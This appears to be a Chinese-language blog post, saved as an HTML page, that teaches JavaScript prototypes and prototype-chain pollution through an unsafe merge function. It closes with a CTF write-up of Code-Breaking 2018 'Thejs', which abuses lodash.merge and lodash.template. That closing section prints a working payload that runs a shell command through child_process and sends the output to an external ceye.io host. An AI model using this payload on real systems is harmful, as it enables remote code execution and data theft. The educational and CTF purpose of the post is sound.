@@ -1,0 +1,261 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>JS原型链污染 · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicn.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">JS原型链污染</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-11-04</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="js"> js</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="JavaScript-原型链污染"><a href="#JavaScript-原型链污染" class="headerlink" title="JavaScript 原型链污染"></a>JavaScript 原型链污染</h1><h2 id="什么是原型"><a href="#什么是原型" class="headerlink" title="什么是原型"></a>什么是原型</h2><p>什么是原型语言 </p>
+<p>只有对象,没有类;对象继承对象,而不是类继承类。 </p>
+<p>“原型对象”是核心概念。原型对象是新对象的模板，它将自身的属性共享给新对象。一个对象不但可以享有自己创建时和运行时定义的属性，而且可以享有原型对象的属性。 </p>
+<p>每一个对象都有自己的原型对象，所有对象构成一个树状的层级系统。root节点的顶层对象是一个语言原生的对象，只有它没有原型对象，其他所有对象都直接或间接继承它的属性。 </p>
+<p>原型语言创建有两个步骤： </p>
+<ul>
+<li><strong>使用”原型对象”作为”模板”生成新对象</strong> ：这个步骤是必要的，这是每个对象出生的唯一方式。以原型为模板创建对象，这也是”原型”(prototype)的原意。</li>
+</ul>
+<ul>
+<li><strong>初始化内部属性</strong>：这一步骤不是必要的。通俗点说，就是，对”复制品”不满意，我们可以”再加工”，使之获得不同于”模板”的”个性”。</li>
+</ul>
+<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>1.普通对象： </p>
+<ul>
+<li>最普通的对象：有<strong>proto</strong>属性（指向其原型链），没有prototype属性。</li>
+</ul>
+<ul>
+<li>原型对象(Person.prototype 原型对象还有constructor属性（指向构造函数对象）)</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通对象  </span></span><br><span class="line"><span class="keyword">var</span> o1 = <span class="keyword">new</span> F1();   </span><br><span class="line"><span class="keyword">var</span> o2 = &#123;&#125;;         </span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> <span class="built_in">Object</span>();   </span><br><span class="line">  </span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> o1);  <span class="comment">//Object  </span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> o2);   <span class="comment">//Object  </span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> o3);   <span class="comment">//Object</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/05/xmpPWrkGBsg2iAV.jpg" alt=""></p>
+<p>2.函数对象：</p>
+<ul>
+<li>凡是通过<code>new Function()</code>创建的都是函数对象。</li>
+</ul>
+<ul>
+<li>拥有<code>__proto__</code>、<code>prototype</code>属性（指向原型对象）</li>
+</ul>
+<ul>
+<li>如<code>Function</code>、<code>Object</code>、<code>Array</code>、<code>Date</code>、<code>String</code>、<code>RegExp</code>、自定义函数</li>
+</ul>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span><span class="params">()</span></span>&#123;&#125;;  </span><br><span class="line"><span class="keyword">var</span> F2 = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;;  </span><br><span class="line"><span class="keyword">var</span> F3 = <span class="function"><span class="keyword">function</span><span class="params">(<span class="string">"n1"</span>,<span class="string">"n2"</span>,<span class="string">"return n1+n2"</span>)</span></span>;  </span><br><span class="line">  </span><br><span class="line">console.log(<span class="keyword">typeof</span> F1);  <span class="comment">//function  </span></span><br><span class="line">console.log(<span class="keyword">typeof</span> F2);  <span class="comment">//function  </span></span><br><span class="line">console.log(<span class="keyword">typeof</span> F3);   <span class="comment">//function</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/05/CLVX8Rvp7UtkmEg.jpg" alt=""></p>
+<p>Array是函数对象，是Function的实例对象，Array是通过newFunction创建出来的。因为Array是Function的实例，所以<code>Array.__proto__ === Function.prototype</code>(Date、String、RegExp等同理)</p>
+<p><img src="https://i.loli.net/2019/11/05/fF1YkKmZvXUIzxr.jpg" alt=""></p>
+<h3 id="prototype和-proto-的关系"><a href="#prototype和-proto-的关系" class="headerlink" title="prototype和__proto__的关系"></a><code>prototype</code>和<code>__proto__</code>的关系</h3><p>JS的哲学是<strong>一切皆对象</strong></p>
+<p>用<code>stack overflow</code>上的来讲他们的区别就是：</p>
+<blockquote>
+<p><code>prototype</code> is a property of a Function object. It is the prototype of objects constructed by that function.</p>
+<p><code>__proto__</code> is internal property of an object, pointing to its prototype. Current standards provide an equivalent Object.getPrototypeOf(O) method, though de facto standard <code>__proto__</code> is quicker.</p>
+<p>You can find instanceof relationships by comparing a function’s prototype to an object’s <code>__proto__</code> chain, and you can break these relationships by changing prototype.</p>
+</blockquote>
+<p><code>__proto__</code>是对象的内置属性，所有对象都有，指向他的原型<br><code>prototype</code>是函数对象的属性，他是通过函数构造的对象的原型</p>
+<p>最高票回答是一句话：</p>
+<blockquote>
+<p><code>__proto__</code>is the actual object that is used in the lookup chain to resolve methods, etc. <code>prototype</code> is the object that is used to build <code>__proto__</code> when you create an object with new</p>
+</blockquote>
+<p><code>__proto__</code>是真正用来查找原型链去获取方法的对象。<code>prototype</code>是在用new创建对象时用来构建<code>__proto__</code>的对象</p>
+<p><code>prototype</code>产生的原因是为了解决js语言出现伊始，创建实例对象时造成资源浪费的问题（参考<a href="http://www.ruanyifeng.com/blog/2011/06/designing_ideas_of_inheritance_mechanism_in_javascript.html" target="_blank" rel="noopener">Javascript继承机制的设计思想</a>）</p>
+<p>JavaScript 继承机制的设计思想就是，原型对象的所有属性和方法，都能被实例对象共享。也就是说，如果属性和方法定义在原型上，那么所有实例对象就能共享，不仅节省了内存，还体现了实例对象之间的联系。</p>
+<p>JavaScript 规定，每个函数都有一个<code>prototype</code>属性，指向一个对象。</p>
+<p>原型对象的作用，就是定义所有实例对象共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。</p>
+<h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p><code>prototype</code>对象有一个<code>constructor</code>属性，默认指向<code>prototype</code>对象所在的构造函数。</p>
+<p>由于<code>constructor</code>属性定义在<code>prototype</code>对象上面，意味着可以被所有实例对象继承<br><img src="https://i.loli.net/2019/11/09/98gp4PAcHviD7Zx.jpg" alt=""></p>
+<p><code>h</code>是<code>Dog</code>的实例对象，但是<code>h</code>自身没有<code>constructor</code>属性，该属性是读取原型链上面的<code>Dog.prototype.construtor</code>属性</p>
+<p><code>constructor</code>属性的作用是，可以得知某个实例对象，到底是哪一个构造函数产生的<br><img src="https://i.loli.net/2019/11/09/lbiHyLj63aomVPw.jpg" alt=""></p>
+<p>原型对象、构造函数、实例对象之间的关系<br><img src="https://pic1.zhimg.com/80/v2-830f96ed4a5765089776e9702120d484_hd.png" alt=""></p>
+<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>JavaScript 规定，所有对象都有自己的原型对象（prototype）。一方面，任何一个对象，都可以充当其他对象的原型；另一方面，由于原型对象也是对象，所以它也有自己的原型。因此，就会形成一个“原型链”（prototype chain）：对象到原型，再到原型的原型……</p>
+<p>如果一层层地上溯，所有对象的原型最终都可以上溯到<code>Object.prototype</code>，即<code>Object</code>构造函数的<code>prototype</code>属性。也就是说，所有对象都继承了<code>Object.prototype</code>的属性。这就是所有对象都有<code>valueOf</code>和<code>toString</code>方法的原因，因为这是从<code>Object.prototype</code>继承的。</p>
+<p>而<code>Object.prototype</code>的原型是<code>null</code>。<code>null</code>没有任何属性和方法，也没有自己的原型。原型链的尽头就是<code>null</code></p>
+<p><strong>原型链是实现继承的主要方法。</strong></p>
+<p>沿用上面的例子：<br><img src="https://i.loli.net/2019/11/09/NxJn73K9SLGFIEQ.jpg" alt=""></p>
+<p>一个对象 <strong>A</strong>的<code>__proto__</code>属性指向的那个对象<strong>B</strong>，<strong>B</strong>就是 <strong>A</strong> 的原型对象（或者叫父对象），对象 <strong>A</strong> 可以使用对象 <strong>B</strong> 中的属性和方法，同时也可以使用对象 <strong>B</strong> 的 原型对象<strong>C</strong> 上的属性和方法，以此递归，就是所谓的原型链</p>
+<p><img src="https://i.loli.net/2019/11/09/twgV9rbqp25fCdc.jpg" alt=""><br>(<code>instanceof</code>运算符返回一个布尔值，表示对象是否为某个构造函数的实例)</p>
+<p><img src="https://i.loli.net/2019/11/09/8h4gmtcaDIYv9ZP.jpg" alt=""></p>
+<p>再用一张图来说明：<br><img src="https://upload-images.jianshu.io/upload_images/13902845-babea8f0cde0d791.jpg?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp" alt=""></p>
+<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>以一个例子来说明：<br><img src="https://i.loli.net/2019/11/09/wjRAVaTz9vYBbXE.jpg" alt=""></p>
+<p>通过更改<code>sam1.__proto__</code>的属性，我们从而成功影响了来自同一类的对象<code>sam2</code>和其父类<code>Object</code></p>
+<p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p>
+<p>这里引述phithon的一个例子：<br>我们利用<code>merge</code>函数：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function <span class="keyword">merge</span>(target, <span class="keyword">source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (let <span class="keyword">key</span> <span class="keyword">in</span> <span class="keyword">source</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">key</span> <span class="keyword">in</span> <span class="keyword">source</span> &amp;&amp; <span class="keyword">key</span> <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="keyword">merge</span>(target[<span class="keyword">key</span>], <span class="keyword">source</span>[<span class="keyword">key</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[<span class="keyword">key</span>] = <span class="keyword">source</span>[<span class="keyword">key</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>存在<code>target[key] = source[key]</code>的键值赋值操作，如果我们试图将<code>key</code>改为<code>__proto__</code>，就有可能出现上一个例子的效果</p>
+<ul>
+<li>尝试一</li>
+</ul>
+<pre>
+let o1 = {}
+let o2 = {a: 1, "__proto__": {b: 2}}
+merge(o1, o2)
+console.log(o1.a, o1.b)
+
+o3 = {}
+console.log(o3.b)
+</pre>
+![](https://i.loli.net/2019/11/10/atJRC1lTUwEAbBV.jpg)
+
+很明显，并没有改造成功，这里的`__proto__`被视为原型，从而遍历`o2`的所有键名
+实际上第二个键值操作，系统会处理为`o2.__proto__ = {b:2}`
+![](https://i.loli.net/2019/11/10/vkL7yHoTz8SUDxI.jpg)
+
+-  尝试二
+
+<pre>
+let o1 = {}
+let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
+merge(o1, o2)
+console.log(o1.a, o1.b)
+
+o3 = {}
+console.log(o3.b)
+</pre>
+
+<p>成功影响了原型链<br><img src="https://i.loli.net/2019/11/10/iRgpnE7JXdTuFPx.jpg" alt=""></p>
+<p>JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历<code>o2</code>的时候会存在这个键。</p>
+<h2 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h2><p>web界面如下：</p>
+<p><img src="https://i.loli.net/2019/12/24/LCsDZfF9dOuXEGT.jpg" alt=""></p>
+<p>设置了两个参数：</p>
+<p><img src="https://i.loli.net/2019/12/24/kaRwdLlzSOq4rGh.jpg" alt=""></p>
+<p>引用了<code>jQuery@3.3.1</code>和<code>select2@4.0.6</code>，其中jQuery这个版本是存在原型链污染的问题，但是不知道参数的使用机制，于是查看源代码</p>
+<p>源码调用了<code>lodash</code>库，然后查询一番，发现了<code>CVE-2019-10744</code>，注意到源码中使用了<code>merge</code>函数：</p>
+<pre>
+app.all('/', (req, res) => {
+    let data = req.session.data || {language: [], category: []}
+    if (req.method == 'POST') {
+        data = lodash.merge(data, req.body)
+        req.session.data = data
+    }
+
+    res.render('index', {
+        language: data.language, 
+        category: data.category
+    })
+})
+</pre>
+
+<p>之前<code>CVE-2019-10744</code>曾提及过，lodash的<code>merge</code>函数存在问题</p>
+<pre>
+merge (target, source)
+
+  foreach property of source
+
+    if property exists and is an object on both the target and the source
+
+      merge(target[property], source[property])
+
+    else
+
+      target[property] = source[property]
+</pre>
+
+<p>注意请求的处理方式：<code>data = lodash.merge(data, req.body)</code>，<code>req.body</code>既是我们的可控点</p>
+<p>重写了<code>app.engine</code>，注意到引用了<code>lodash.template</code><br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>查看<code>template</code>函数，寻找可控点：</p>
+<pre>
+var result = attempt(function() {
+    return Function(importsKeys, sourceURL + 'return ' + source)
+      .apply(undefined, importsValues);
+  });
+</pre>
+
+<p>跟入<code>sourceURL</code>：</p>
+<pre>
+var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
+</pre>
+
+<p>其中 option 为我们在模版引擎中，渲染的值。这里读取其中的 sourceURL 属性的值，我们就可以通过原型污染，添加一个 sourceURL 属性并控制值，在拼接到 Function 中达到执行 JS 的目的</p>
+<p>得到payload：</p>
+<pre>
+{"__proto__":{"sourceURL":"xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();var req = require('http').request(`http://httprequest.test.xxxx.ceye.io/${result}`);req.end();\r\n"}}
+</pre>
+
+<p>利用<code>ceye.io</code>，拿到flag<br><img src="https://i.loli.net/2019/12/24/Lhv53iOPxdtMelH.jpg" alt=""></p>
+<p>reference：<br><a href="http://dmitrysoshnikov.com/ecmascript/javascript-the-core/#constructor" target="_blank" rel="noopener">http://dmitrysoshnikov.com/ecmascript/javascript-the-core/#constructor</a><br><a href="https://juejin.im/post/5bebc6a3e51d4575125a39ca#heading-1" target="_blank" rel="noopener">https://juejin.im/post/5bebc6a3e51d4575125a39ca#heading-1</a><br><a href="https://www.jianshu.com/p/686b61c4a43d" target="_blank" rel="noopener">https://www.jianshu.com/p/686b61c4a43d</a><br><a href="http://www.sxfda.cn/The-hacker-safe/520.html" target="_blank" rel="noopener">http://www.sxfda.cn/The-hacker-safe/520.html</a><br><a href="https://www.jianshu.com/p/3d03f3e83cf5" target="_blank" rel="noopener">https://www.jianshu.com/p/3d03f3e83cf5</a><br><a href="https://zhuanlan.zhihu.com/p/22787302" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22787302</a><br><a href="https://smi1e.top/javascript-原型链污染/" target="_blank" rel="noopener">https://smi1e.top/javascript-原型链污染/</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a><br><a href="https://wangdoc.com/javascript/oop/prototype.html" target="_blank" rel="noopener">https://wangdoc.com/javascript/oop/prototype.html</a><br><a href="https://zhuanlan.zhihu.com/p/73186974" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/73186974</a><br><a href="https://cloud.tencent.com/developer/article/1516331" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1516331</a><br><a href="https://www.venustech.com.cn/article/1/9577.html" target="_blank" rel="noopener">https://www.venustech.com.cn/article/1/9577.html</a><br><a href="https://blog.l0ca1.xyz/Code-Breaking" target="_blank" rel="noopener">https://blog.l0ca1.xyz/Code-Breaking</a></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/11/04/vulnerable/js原型链污染/">http://microvorld.com/2019/11/04/vulnerable/js原型链污染/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/12/23/漏洞挖掘/logic-vuln/" title="logic vuln"><span>< PreviousPost</span><br><span class="prevTitle">logic vuln</span></a><a class="nextSlogan" href="/2019/11/02/JS挖坑/js(3)/" title="promise对象"><span>NextPost ></span><br><span class="nextTitle">promise对象</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaScript-原型链污染"><span class="toc-number">1.</span> <span class="toc-text">JavaScript 原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是原型"><span class="toc-number">1.1.</span> <span class="toc-text">什么是原型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#对象"><span class="toc-number">1.2.</span> <span class="toc-text">对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#prototype和-proto-的关系"><span class="toc-number">1.2.1.</span> <span class="toc-text">prototype和__proto__的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#constructor-NaN"><span class="toc-number">1.2.2.</span> <span class="toc-text">constructor</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原型链"><span class="toc-number">1.3.</span> <span class="toc-text">原型链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原型链污染"><span class="toc-number">1.4.</span> <span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Breaking-2018-Thejs"><span class="toc-number">1.5.</span> <span class="toc-text">Code-Breaking 2018 Thejs</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
